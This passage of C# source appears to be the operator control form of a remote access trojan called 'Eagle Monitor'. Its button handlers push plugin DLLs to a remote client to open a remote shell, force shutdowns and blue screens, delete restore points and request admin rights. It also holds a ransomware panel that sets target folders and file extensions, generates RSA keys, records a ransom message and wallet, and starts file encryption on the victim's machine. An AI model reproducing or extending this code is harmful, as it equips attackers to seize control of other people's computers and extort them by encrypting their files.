            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
        }

        private void volumeDownGuna2Button_Click(object sender, EventArgs e)
        {
            MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_AUDIO_DOWN)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, miscellaneousPacket);
        }
        #endregion
        #region "Web"
        private void linkWebGuna2Button_Click(object sender, EventArgs e)
        {
            OpenUrlPacket openUrlPacket = new OpenUrlPacket(linkWebGuna2TextBox.Text)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
            };
            ClientHandler.StartSendData(ClientHandler, openUrlPacket);
        }
        #endregion
        #region "Power"
        private void setPowerGuna2Button_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket;
            switch (powerStateGuna2ComboBox.SelectedIndex)
            {
                case 0:
                    powerPacket = new PowerPacket(PacketType.POWER_SHUTDOWN);
                    break;

                case 1:
                    powerPacket = new PowerPacket(PacketType.POWER_REBOOT);
                    break;

                case 2:
                    powerPacket = new PowerPacket(PacketType.POWER_LOG_OUT);
                    break;

                case 3:
                    powerPacket = new PowerPacket(PacketType.POWER_BSOD);
                    break;

                case 4:
                    powerPacket = new PowerPacket(PacketType.POWER_LOCK_WORKSTATION);
                    break;

                case 5:
                    powerPacket = new PowerPacket(PacketType.POWER_HIBERNATE);
                    break;

                case 6:
                    powerPacket = new PowerPacket(PacketType.POWER_SUSPEND);
                    break;

                default:
                    return;
            }
            powerPacket.Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\PowerManager.dll"), 1);
            ClientHandler.StartSendData(this.ClientHandler, powerPacket);
        }
        #endregion
        #endregion
        #region "UAC"
        #region "Restore Points"
        private void refreshRestorePointToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RestorePointPacket restorePointPacket = new RestorePointPacket
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Admin.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, restorePointPacket);
        }

        private void deleteRestorePointToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow selected in this.restorePointDataGridView.SelectedRows)
            {
                DeleteRestorePointPacket deleteRestorePointPacket = new DeleteRestorePointPacket(int.Parse(selected.Cells[0].Value.ToString()))
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Admin.dll"), 1)
                };
                ClientHandler.StartSendData(this.ClientHandler, deleteRestorePointPacket);
            }
        }
        #endregion
        private void askUACGuna2Button_Click(object sender, EventArgs e)
        {
            if (!this.ClientHandler.IsAdmin)
            {
                AskAdminRightsPacket askAdminRightsPacket = new AskAdminRightsPacket
                {
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
                };
                ClientHandler.StartSendData(this.ClientHandler, askAdminRightsPacket);
            }
        }
        #endregion
        #region "Ransomware"
        private void removePathToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow pathAffected in this.pathRansomwareDataGridView.SelectedRows)
            {
                this.pathRansomwareDataGridView.Rows.RemoveAt(pathAffected.Index);
            }
        }

        private void addExtensionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string newExt = Interaction.InputBox("New extension (without '.') :");

            int rowId = this.pathRansomwareDataGridView.Rows.Add();

            DataGridViewRow row = this.pathRansomwareDataGridView.Rows[rowId];

            row.Cells["Column47"].Value = newExt;
        }

        private void removeExtensionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow pathAffected in this.pathRansomwareDataGridView.SelectedRows)
            {
                this.extensionRansomwareDataGridView.Rows.RemoveAt(pathAffected.Index);
            }
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow nativePE in this.pathRansomwareDataGridView.SelectedRows)
            {
                this.pathRansomwareDataGridView.Rows.RemoveAt(nativePE.Index);
            }
        }

        private void generateRSAKeyGuna2Button_Click(object sender, EventArgs e)
        {
            if (File.Exists(this.ClientHandler.ClientPath + "\\Ransomware\\encryption.json"))
            {
                DialogResult r = MessageBox.Show("You are going to re-generate RSA keys pair for client, are you sure ?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (r.Equals(DialogResult.Yes))
                {
                    Misc.EncryptionInformation encryptionInformation = JsonConvert.DeserializeObject<Misc.EncryptionInformation>(File.ReadAllText(ClientHandler.ClientPath + "\\Ransomware\\encryption.json"));
                    Dictionary<string, string> rsaKey = Misc.Encryption.GetKey();
                    encryptionInformation.publicRSAServerKey = rsaKey["PublicKey"];
                    encryptionInformation.privateRSAServerKey = rsaKey["PrivateKey"];

                    string rsa = JsonConvert.SerializeObject(encryptionInformation);
                    File.WriteAllText(this.ClientHandler.ClientPath + "\\Ransomware\\encryption.json", rsa);
                    this.ClientHandler.EncryptionInformation = encryptionInformation;
                }
                return;
            }
        }

        private void startEncryptionGuna2Button_Click(object sender, EventArgs e)
        {
            List<string> paths = new List<string>();

            foreach (DataGridViewRow row in pathRansomwareDataGridView.Rows)
            {
                paths.Add(row.Cells[0].Value.ToString());
            }


            List<string> extensions = new List<string>();

            foreach (DataGridViewRow ext in extensionRansomwareDataGridView.Rows)
            {
                extensions.Add(ext.Cells[0].Value.ToString());
            }

            Misc.EncryptionInformation encryptionInformation = JsonConvert.DeserializeObject<Misc.EncryptionInformation>(File.ReadAllText(ClientHandler.ClientPath + "\\Ransomware\\encryption.json"));
            encryptionInformation.wallet = walletGuna2TextBox.Text;
            encryptionInformation.msg = msgRansomwareGuna2TextBox.Text;
            encryptionInformation.paths = paths;
            encryptionInformation.extensionFile = extensions;

            encryptionInformation.checkExtensions = checkExtensionsGuna2CheckBox.Checked;
            encryptionInformation.subfolders = subDirectoriesGuna2CheckBox.Checked;

            string newInformation = JsonConvert.SerializeObject(encryptionInformation);
            File.WriteAllText(this.ClientHandler.ClientPath + "\\Ransomware\\encryption.json", newInformation);
            this.ClientHandler.EncryptionInformation = encryptionInformation;

            RansomwareEncryptionPacket ransomwareEncryptionPacket = new RansomwareEncryptionPacket(this.ClientHandler.EncryptionInformation.publicRSAServerKey, this.ClientHandler.EncryptionInformation.paths, this.ClientHandler.EncryptionInformation.subfolders, this.ClientHandler.EncryptionInformation.checkExtensions)
            {
                Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Ransomware.dll"), 1),
                msg = this.msgRansomwareGuna2TextBox.Text,
                wallet = this.walletGuna2TextBox.Text
            };
            ClientHandler.StartSendData(this.ClientHandler, ransomwareEncryptionPacket);
        }

        private void startDecryptionGuna2Button_Click(object sender, EventArgs e)
        {
            RansomwareDecryptionPacket ransomwareDecryptionPacket = new RansomwareDecryptionPacket(this.ClientHandler.EncryptionInformation.privateRSAServerKey)
            {
                Plugin = PacketLib.Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\Ransomware.dll"), 1)
            };
            ClientHandler.StartSendData(this.ClientHandler, ransomwareDecryptionPacket);
        }
        #endregion
        #region "Shell"
        private void remoteShellGuna2Button_Click(object sender, EventArgs e)
        {
            if (this.remoteShellGuna2Button.Text == "Start Session")
            {
                this.RemoteShellHandler = new RemoteShellHandler();
                StartShellSessionPacket startShellSessionPacket = new StartShellSessionPacket(remoteShellGuna2ToggleSwitch.Checked)
                {
                    BaseIp = this.ClientHandler.IP,
                    HWID = this.ClientHandler.HWID,
                    Plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Misc.Utils.GPath + "\\Plugins\\RemoteShell.dll"), 1)
                };
                ClientHandler.StartSendData(this.ClientHandler, startShellSessionPacket);
                this.remoteShellGuna2Button.Text = "Stop Session";
            }
            else 
            {
                if (ClientHandler != null)
                {
                    StopShellSessionPacket stopShellSessionPacket = new StopShellSessionPacket()
                    {
                        BaseIp = this.ClientHandler.IP,
                        HWID = this.ClientHandler.HWID
                    };
                    ClientHandler.StartSendData(this.RemoteShellHandler.ClientHandler, stopShellSessionPacket);

                    this.remoteShellGuna2ToggleSwitch.Enabled = true;
                    this.remoteShellGuna2TextBox.Enabled = false;
                }
                this.remoteShellGuna2Button.Text = "Start Session";
            }
        }

        private void remoteShellGuna2TextBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(this.remoteShellGuna2TextBox.Text.Trim()))
            {
                string input = this.remoteShellGuna2TextBox.Text.TrimStart(' ', ' ').TrimEnd(' ', ' ');
                this.remoteShellGuna2TextBox.Text = string.Empty;

                switch (input)
                {
                    case "cls":
                        this.remoteShellStdOutRichTextBox.Text = string.Empty;
                        break;
                    default:
                        NewCommandShellSessionPacket newCommandShellSessionPacket = new NewCommandShellSessionPacket(input)
                        {
                            BaseIp = this.ClientHandler.IP,
                            HWID = this.ClientHandler.HWID
                        };
                        ClientHandler.StartSendData(this.RemoteShellHandler.ClientHandler, newCommandShellSessionPacket);
                        break;
                }

                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void remoteShellStdOutRichTextBox_TextChanged(object sender, EventArgs e)
        {
            Misc.Imports.SendMessage(this.remoteShellStdOutRichTextBox.Handle, Misc.Imports.WM_VSCROLL, Misc.Imports.SB_PAGEBOTTOM, IntPtr.Zero);
        }
        #endregion
        private void mainGuna2TabControl_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (mainGuna2TabControl.SelectedIndex) 
            {
                case 6:
                    MessageBox.Show("This module is in beta, use it carefully !", "Eagle Monitor", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    break;
            }
        }
    }
}
